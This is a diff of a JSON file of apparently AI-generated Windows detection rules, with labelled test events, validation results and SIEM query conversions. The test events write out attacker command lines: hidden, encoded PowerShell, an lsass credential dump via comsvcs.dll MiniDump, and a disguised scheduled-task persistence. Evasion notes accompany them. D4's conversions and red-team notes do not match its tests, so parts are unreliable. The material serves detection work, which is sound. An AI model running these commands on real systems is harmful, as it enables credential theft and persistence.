-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\cscript.exe",
-            "CommandLine": "cscript.exe //nologo \\\\server\\share\\script.vbs",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "N2",
-          "label": "negative",
-          "description": "Explorer.exe spawning cmd.exe, a normal user-initiated process.",
-          "event": {
-            "ParentImage": "C:\\Windows\\Explorer.exe",
-            "Image": "C:\\Windows\\System32\\cmd.exe",
-            "CommandLine": "cmd.exe",
-            "User": "CONTOSO\\john.doe"
-          }
-        },
-        {
-          "id": "N3",
-          "label": "negative",
-          "description": "Legitimate software update using WMI to launch msiexec.exe, not cmd or powershell.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\msiexec.exe",
-            "CommandLine": "msiexec.exe /update \\\\server\\share\\patch.msp /quiet",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R1",
-          "label": "positive",
-          "description": "WmiPrvSE.exe with 8.3 short-name parent directories spawning cmd.exe; tests path normalization resilience.",
-          "event": {
-            "ParentImage": "C:\\WINDO~1\\SYSTEM32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\cmd.exe",
-            "CommandLine": "cmd.exe /c net user",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R2",
-          "label": "positive",
-          "description": "WmiPrvSE.exe on non-system drive (D:) spawning powershell.exe from SysWOW64; tests alternate volume and WoW64 path.",
-          "event": {
-            "ParentImage": "D:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\SysWOW64\\powershell.exe",
-            "CommandLine": "powershell.exe -nop -w hidden -enc SQBuAHYAbwByAGUALAAgACIAOwAkAHMAdABiAHMAaQBuAGkAdABlACAAPQAiAHMAZABmAGIAIgB9ADsAKQAoAA==",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "WmiPrvSE.exe spawning cmd.exe copied to a user-writable directory but retaining original filename; tests filename-based detection despite unusual location.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Users\\Public\\Downloads\\cmd.exe",
-            "CommandLine": "\"cmd.exe\" /c ipconfig /all",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R4",
-          "label": "positive",
-          "description": "Casing variation on directory components only (lowercase drive and folders) while binary names keep correct case; tests case-insensitive path matching.",
-          "event": {
-            "ParentImage": "c:\\windows\\system32\\WmiPrvSE.exe",
-            "Image": "c:\\windows\\system32\\cmd.exe",
-            "CommandLine": "cmd /c whoami /all",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R5",
-          "label": "positive",
-          "description": "WmiPrvSE.exe spawning powershell.exe from a non-standard Program Files path but with correct filename; tests depth and space handling in path.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Program Files\\WindowsPowerShell\\powershell.exe",
-            "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Get-Process\"",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Legitimate admin using WMI to run a VBScript via cscript.exe; child is not cmd.exe or powershell.exe.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\cscript.exe",
-            "CommandLine": "cscript.exe //B //Nologo C:\\AdminScripts\\inventory.vbs",
-            "User": "CORP\\jsmith"
-          }
-        },
-        {
-          "id": "R7",
-          "label": "negative",
-          "description": "Authorized patch management (SCCM) invoking msiexec.exe via WMI provider for software installation.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\msiexec.exe",
-            "CommandLine": "msiexec.exe /i C:\\Windows\\CCM\\Packages\\KB5001234.msi /qn",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R8",
-          "label": "negative",
-          "description": "Monitoring tool (e.g., SolarWinds) using WMI to launch rundll32.exe for plugin execution; benign child binary.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\rundll32.exe",
-            "CommandLine": "rundll32.exe C:\\Program Files\\SolarWinds\\Plugins\\SwiPerf.dll",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        }
-      ],
-      "validation": {
-        "candidate_id": "D4",
-        "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE ParentImage LIKE '%\\\\WmiPrvSE.exe' ESCAPE '\\' AND (Image LIKE '%\\\\cmd.exe' ESCAPE '\\' OR Image LIKE '%\\\\powershell.exe' ESCAPE '\\')",
-        "issues": [
-          {
-            "severity": "warning",
-            "code": "attack_id_deprecated",
-            "message": "ATT&CK technique T1028 (Windows Remote Management) is deprecated or revoked."
-          }
-        ],
-        "test_outcomes": [
-          {
-            "event_id": "P1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "N1",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N2",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N3",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R4",
-            "label": "positive",
-            "matched": true,
-            "passed": true
           },
           {
             "event_id": "R5",
@@ -1335,6 +785,12 @@
           },
           {
             "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
             "label": "negative",
             "matched": false,
             "passed": true
@@ -1342,7 +798,7 @@
         ],
         "positives_total": 8,
         "positives_matched": 8,
-        "negatives_total": 6,
+        "negatives_total": 7,
         "negatives_matched": 0,
         "benign_total": 1200,
         "benign_hits": 0,
@@ -1350,10 +806,10 @@
         "passed": true
       },
       "conversions": {
-        "splunk": "ParentImage=\"*\\\\WmiPrvSE.exe\" Image IN (\"*\\\\cmd.exe\", \"*\\\\powershell.exe\")",
-        "elasticsearch": "ParentImage:*\\\\WmiPrvSE.exe AND (Image:(*\\\\cmd.exe OR *\\\\powershell.exe))",
-        "kusto": "DeviceProcessEvents\n| where InitiatingProcessFolderPath endswith \"\\\\WmiPrvSE.exe\" and (FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\")",
-        "sqlite": "SELECT * FROM logs WHERE ParentImage LIKE '%\\\\WmiPrvSE.exe' ESCAPE '\\' AND (Image LIKE '%\\\\cmd.exe' ESCAPE '\\' OR Image LIKE '%\\\\powershell.exe' ESCAPE '\\')"
+        "splunk": "Image=\"*\\\\rundll32.exe\" CommandLine=\"*comsvcs.dll*\" CommandLine=\"*MiniDump*\" (CommandLine=\"*C:\\\\Users\\\\Public\\\\*\" CommandLine=\"*.dmp*\") OR (CommandLine=\"*C:\\\\Windows\\\\Temp\\\\*\" CommandLine=\"*.dmp*\")",
+        "elasticsearch": "(Image:*\\\\rundll32.exe AND (CommandLine:*comsvcs.dll* AND CommandLine:*MiniDump*)) AND ((CommandLine:*C\\:\\\\Users\\\\Public\\\\* AND CommandLine:*.dmp*) OR (CommandLine:*C\\:\\\\Windows\\\\Temp\\\\* AND CommandLine:*.dmp*))",
+        "kusto": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\rundll32.exe\" and (ProcessCommandLine contains \"comsvcs.dll\" and ProcessCommandLine contains \"MiniDump\")) and ((ProcessCommandLine contains \"C:\\\\Users\\\\Public\\\\\" and ProcessCommandLine contains \".dmp\") or (ProcessCommandLine contains \"C:\\\\Windows\\\\Temp\\\\\" and ProcessCommandLine contains \".dmp\"))",
+        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%\\\\rundll32.exe' ESCAPE '\\' AND (CommandLine LIKE '%comsvcs.dll%' ESCAPE '\\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\\')) AND ((CommandLine LIKE '%C:\\\\Users\\\\Public\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.dmp%' ESCAPE '\\') OR (CommandLine LIKE '%C:\\\\Windows\\\\Temp\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.dmp%' ESCAPE '\\'))"
       },
       "conversion_errors": {},
       "history": [
@@ -1367,54 +823,52 @@
         {
           "iteration": 0,
           "phase": "redteam",
-          "summary": "8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/1200",
+          "summary": "9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200",
           "passed": true,
           "change_summary": ""
         }
       ],
-      "author_notes": "Rule focuses on the distinctive parent-child relationship between WmiPrvSE.exe and cmd/powershell.exe, which is rare in legitimate activity. Tested against common false positives like WMI-launched cscript.exe or msiexec.exe to ensure specificity.",
-      "redteam_analysis": "Positive variants P4-P8 cover realistic evasions that a well-written rule (case-insensitive endswith, path normalization) should catch: 8.3 short names, alternate volumes, non-standard but same-filename child locations, directory casing changes, and deep paths with spaces. Negative variants N1-N3 represent benign WmiPrvSE.exe children (cscript, msiexec, rundll32) that must not trigger the rule. Out-of-scope variants O1-O3 are evasions the current rule cannot detect because they rely on OriginalFileName (unavailable) or sibling binaries not in the rule (pwsh.exe); a mature detection would require either OriginalFileName enrichment or an expanded child-binary allowlist.",
+      "author_notes": "",
+      "redteam_analysis": "Positive variants (P4-P8) preserve all rule-required literals: Image ends with \\rundll32.exe, CommandLine contains exact 'comsvcs.dll' and 'MiniDump', and either 'C:\\Users\\Public\\' + '.dmp' or 'C:\\Windows\\Temp\\' + '.dmp'. They vary parent process (PowerShell, wscript, svchost), whitespace (extra spaces, tabs), quoting styles (single, double, none), binary location (SysWOW64, copied same-name binary), and output filenames. A well-written rule using case-insensitive contains on the CLI fragments and a suffix match on Image would catch all. Negative variants (N1-N4) are benign look-alikes that miss at least one required fragment: N1 lacks MiniDump, N2 lacks comsvcs.dll, N3 outputs to non-monitored directory, N4 lacks both MiniDump and target directory. Out-of-scope variants (O1-O3) represent realistic evasions the current logsource/rule cannot see: O1/O2 use environment variables and 8.3 short names that the sensor records literally, so the rule's literal path fragments are absent; O3 renames the binary, breaking the Image suffix match. The rule would need OriginalFileName (if available in sysmon) or path expansion to cover O1-O3.",
+      "retired_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Attacker copies cmd.exe to a random name (evil.exe) and spawns it; Image no longer ends with cmd.exe and OriginalFileName field is unavailable in this logsource.",
+          "description": "Attacker uses %TEMP% environment variable in command line; sensor records literal %TEMP%, rule expects C:\\Windows\\Temp\\",
           "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Temp\\evil.exe",
-            "CommandLine": "evil.exe /c net groupmap",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1111 %TEMP%\\lsass.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "Attacker uses pwsh.exe (PowerShell 7+) instead of powershell.exe; sibling LOLBin achieves same goal but rule lacks selection for it.",
+          "description": "Attacker uses 8.3 short name for Windows\\Temp (TEM~1); sensor records short name, rule expects long name",
           "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
-            "CommandLine": "pwsh.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwByAGUALAAgACIAOwAkAHMAdABiAHMAaQBuAGkAdABlACAAPQAiAHMAZABmAGIAIgB9ADsAKQAoAA==",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 2222 C:\\Windows\\TEM~1\\lsass.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         },
         {
           "id": "X3",
           "label": "positive",
-          "description": "Attacker renames WmiPrvSE.exe to WmiPrvSE2.exe and runs it as parent; ParentImage no longer ends with WmiPrvSE.exe and OriginalFileName unavailable.",
+          "description": "Attacker renames rundll32.exe to evade Image check; Image no longer ends with rundll32.exe, rule keys only on Image",
           "event": {
-            "ParentImage": "C:\\Windows\\Temp\\WmiPrvSE2.exe",
-            "Image": "C:\\Windows\\System32\\cmd.exe",
-            "CommandLine": "cmd.exe /c systeminfo",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "Image": "C:\\Windows\\Temp\\evil.exe",
+            "CommandLine": "C:\\Windows\\Temp\\evil.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 3333 C:\\Windows\\Temp\\lsass.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         }
       ]
     },
     {
       "candidate_id": "D2",
-      "title": "Schtasks Creating Scheduled Task With Powershell From Programdata Or Public Directories",
-      "sigma_yaml": "title: Schtasks Creating Scheduled Task With Powershell From Programdata Or Public Directories\nid: 1cfc987e-0418-46ba-af1f-2440a6c4aa77\nstatus: experimental\ndescription: 'Detects schtasks.exe creating a scheduled task where the task run parameter launches powershell.exe from suspicious\n  directories such as C:\\ProgramData or C:\\Users\\Public, which is indicative of persistence abuse commonly seen in post-exploitation\n  activity.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.persistence\n- attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_parent:\n    'ParentImage|endswith': '\\schtasks.exe'\n  selection_cmd:\n    'CommandLine|contains':\n    - powershell.exe\n    - -f\n  selection_ps_payload:\n    'CommandLine|contains': .ps1\n  selection_programdata:\n    'CommandLine|contains': 'C:\\\\ProgramData\\\\'\n  selection_public:\n    'CommandLine|contains|all':\n    - 'C:\\\\Users\\\\Public\\\\'\n    - .ps1\n  condition: selection_parent and selection_cmd and selection_ps_payload and (selection_programdata or selection_public)\nfalsepositives:\n- Legitimate administrative scripts deployed via Group Policy or software deployment tools placing .ps1 files in ProgramData\n  or Public directories\n- SCCM or Intune deploying PowerShell scripts from approved internal locations to these directories for compliance or monitoring\nlevel: high\n",
-      "status": "needs_review",
+      "title": "Suspicious Scheduled Task Creation Mimicking UpdateHealth with Hidden PowerShell",
+      "sigma_yaml": "title: Suspicious Scheduled Task Creation Mimicking UpdateHealth with Hidden PowerShell\nid: 0fe27b2a-8754-439f-b8bb-e35b2e2e58df\nstatus: experimental\ndescription: 'Detects creation of a scheduled task named UpdateHealth under Microsoft\\Windows\\UpdateOrchestrator that executes\n  PowerShell with hidden/bypass flags loading a script from a hidden ProgramData cache directory, indicative of Saltmarsh\n  persistence mechanism.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.execution\n- attack.privilege-escalation\n- attack.persistence\n- attack.t1053.005\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: '4698'\n    'TaskName|contains': '\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth'\n    'TaskContent|contains|all':\n    - powershell.exe\n    - -nop\n    - -w hidden\n    - -ep bypass\n    - '-f C:\\ProgramData\\.cache\\uh.ps1'\n  filter_legitimate_tasks:\n    'TaskName|contains': '\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule'\n    'TaskContent|contains|all':\n    - powershell.exe\n    - -ExecutionPolicy\n    - Bypass\n    - -WindowStyle\n    - Hidden\n    - -File\n  condition: selection and not filter_legitimate_tasks\nfalsepositives:\n- Legitimate Windows UpdateOrchestrator tasks that use PowerShell with bypass/hidden flags from non-hidden paths\n- Administrative troubleshooting tasks using similar PowerShell syntax but targeting standard script locations\nlevel: high\n",
+      "status": "validated",
       "attack_technique_ids": [
         "T1053.005"
       ],
@@ -1422,189 +876,145 @@
         {
           "id": "P1",
           "label": "positive",
-          "description": "schtasks.exe creating a scheduled task with PowerShell payload from C:\\ProgramData\\.cache\\uh.ps1 mimicking UpdateOrchestrator",
+          "description": "Saltmarsh-style scheduled task creation with UpdateHealth name and hidden PowerShell payload from ProgramData cache",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth /sc hourly /ru SYSTEM /tr \"powershell.exe -nop -w hidden -ep bypass -f C:\\\\ProgramData\\\\.cache\\\\uh.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "schtasks.exe creating a scheduled task referencing a PowerShell script in C:\\Users\\Public\\Documents\\script.ps1",
+          "description": "Variant with different casing in flags and alternate task content structure",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn UpdateAssistant /sc daily /ru SYSTEM /tr \"powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\Documents\\script.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions><Exec><Command>PowerShell.EXE</Command><Arguments>-NOP -W HIDDEN -EP BYPASS -F C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "schtasks.exe creating a task using encoded PowerShell command pointing to a .ps1 file in ProgramData",
+          "description": "Same malicious pattern with task registered under SYSTEM and hourly trigger",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn SystemUpdate /sc minute /mo 5 /ru SYSTEM /tr \"powershell.exe -EncodedCommand JABwAGE... -f C:\\ProgramData\\Microsoft\\Windows\\Defender\\AdvancedThreatProtection\\cache.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Triggers><Trigger><ScheduleByHour><HoursInterval>1</HoursInterval></ScheduleByHour></Trigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate schtasks.exe call creating a task that runs a native binary from System32",
+          "description": "Legitimate Windows UpdateOrchestrator Schedule task with PowerShell from system path",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn DiskCleanup /sc daily /ru SYSTEM /tr \"C:\\Windows\\System32\\cleanmgr.exe\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule",
+            "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\PSWindowsUpdate\\Invoke-WUJob.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "Administrator manually creating a task with PowerShell from a trusted admin share (not ProgramData/Public)",
+          "description": "Administrative troubleshooting task using visible PowerShell from user profile",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn AdminCheck /sc weekly /ru SYSTEM /tr \"powershell.exe -File \\filesrv\\scripts\\healthcheck.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\HealthCheck",
+            "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-NoProfile -WindowStyle Normal -ExecutionPolicy RemoteSigned -File C:\\Users\\Administrator\\Scripts\\HealthCheck.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Software update using schtasks.exe to deploy a PowerShell script from a verified vendor directory",
+          "description": "Standard software update task using schtasks with non-hidden script location",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn AVUpdate /sc hourly /ru SYSTEM /tr \"powershell.exe -File C:\\Program Files\\Contoso\\AVUpdate\\update.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions><Exec><Command>schtasks.exe</Command><Arguments>/Create /TN \"UpdateHealth\" /TR \"C:\\Program Files\\Common Files\\UpdateHelper\\update.exe\" /SC HOURLY /RU SYSTEM</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "Casing variation (PowerShell.EXE), mixed quoting, -File flag (contains -f), same suspicious ProgramData path",
+          "description": "Flags reordered with extra whitespace; all required substrings present verbatim in TaskContent",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth\" /sc HOURLY /ru SYSTEM /tr 'PowerShell.EXE -NoP -W Hidden -EP Bypass -File \"C:\\ProgramData\\.cache\\uh.ps1\"' /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-w hidden  -nop  -ep bypass  -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "Sibling LOLBin pwsh.exe, 8.3 short name PUBLIC~1 for Users\\Public, parameter reordering (-f first)",
+          "description": "Full path to powershell.exe (still contains 'powershell.exe' substring), XML attributes single-quoted",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"SystemUpdate\" /sc MINUTE /mo 5 /ru SYSTEM /tr \"pwsh.exe -f C:\\Users\\PUBLIC~1\\Documents\\script.ps1 -ep bypass -nop\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "CORP\\admin"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context='Author'><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "UNC path (\\\\localhost\\C$\\ProgramData\\...), extra whitespace, single quotes around task name and action",
+          "description": "Complete task XML with Principals and Triggers, flags reordered in Arguments",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn 'UpdateAssistant' /sc DAILY /ru SYSTEM /tr 'powershell.exe -f  \\\\localhost\\C$\\ProgramData\\Microsoft\\Windows\\Defender\\cache.ps1  -ep bypass' /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Triggers><Trigger><ScheduleByHour><HoursInterval>1</HoursInterval></ScheduleByHour></Trigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-ep bypass -w hidden -nop -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R4",
           "label": "positive",
-          "description": "Double extension (.ps1.bak), environment variable %SystemDrive%, mixed-case flags, ProgramData path",
+          "description": "Arguments element before Command, extra whitespace in XML, all five required substrings intact",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"DefenderUpdate\" /sc ONLOGON /ru SYSTEM /tr \"powershell.exe -ExecutionPolicy Bypass -File %SystemDrive%\\ProgramData\\Scripts\\malware.ps1.bak -WindowStyle Hidden\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "CORP\\jsmith"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments><Command>C:\\Windows\\System32\\powershell.exe</Command></Exec></Actions></Task>"
           }
         },
         {
           "id": "R5",
-          "label": "positive",
-          "description": "Alternate flag -FilePath (contains -f), forward slashes in path, no quoting around action",
+          "label": "negative",
+          "description": "Legitimate UpdateOrchestrator Schedule task caught by filter_legitimate_tasks (Schedule in name, long-form flags, standard path)",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"UpdateTask\" /sc HOURLY /ru SYSTEM /tr powershell.exe -FilePath C:/ProgramData/Updates/update.ps1 -NoProfile -NonInteractive /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\ScheduleScan",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\Tasks\\maintenance.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R6",
           "label": "negative",
-          "description": "Legitimate admin task using schtasks.exe but script in System32 (not ProgramData/Public), parent still schtasks.exe",
+          "description": "Admin-created task named UpdateHealth but with only -File flag and a normal script path",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"Microsoft\\Windows\\Maintenance\\HealthCheck\" /sc DAILY /ru SYSTEM /tr \"powershell.exe -File C:\\Windows\\System32\\maintenance.ps1\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "CORP\\admin"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-File C:\\Scripts\\admin.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "R7",
           "label": "negative",
-          "description": "SCCM automation using pwsh.exe (not powershell.exe) in ProgramData, parent is ccmexec.exe",
+          "description": "SCCM/Intune task in different folder, long-form flags, legitimate script location",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"ConfigMgrCompliance\" /sc ONLOGON /ru SYSTEM /tr \"pwsh.exe -f C:\\ProgramData\\Microsoft\\ConfigMgr\\compliance.ps1\" /f",
-            "ParentImage": "C:\\Windows\\CCM\\ccmexec.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R8",
-          "label": "negative",
-          "description": "Installer creating task for .bat file (no powershell.exe), parent is msiexec.exe",
-          "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"AppInstaller\" /sc ONCE /ru SYSTEM /tr \"C:\\Users\\Public\\Installer\\setup.bat\" /f",
-            "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
-            "User": "CORP\\installer"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\SCCM\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -File C:\\Windows\\CCM\\Scripts\\update.ps1</Arguments></Exec></Actions></Task>"
           }
         }
       ],
       "validation": {
         "candidate_id": "D2",
         "parse_ok": true,
